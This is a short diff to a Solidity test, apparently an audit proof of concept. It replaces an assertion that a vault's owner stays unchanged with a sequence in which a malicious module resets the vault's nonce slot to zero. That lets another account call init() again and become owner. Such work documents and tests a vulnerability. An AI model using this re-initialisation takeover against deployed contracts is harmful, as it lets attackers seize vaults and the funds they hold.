@@ -57,9 +57,16 @@ contract MaliciousTest is MaliciousTestUtil {
       initializeMalicious(alice);
 
 
-      address oldOwner = IVault(vault).owner();
-      alice.maliciousModule.setIndex(vault, 0, bytes32(uint256(uint160(bob.addr))), setIndexProof);
-      assertEq(oldOwner, IVault(vault).owner());
+      // set the nonce back to 0
+      alice.maliciousModule.setIndex(vault, 2, bytes32(uint256(0)), setIndexProof);
+
+      // This allows bob to call init()
+      vm.startPrank(bob.addr);
+      IVault(vault).init();
+      vm.stopPrank();
+
+      assertEq(IVault(vault).owner(), bob.addr);
+
 
     }
 
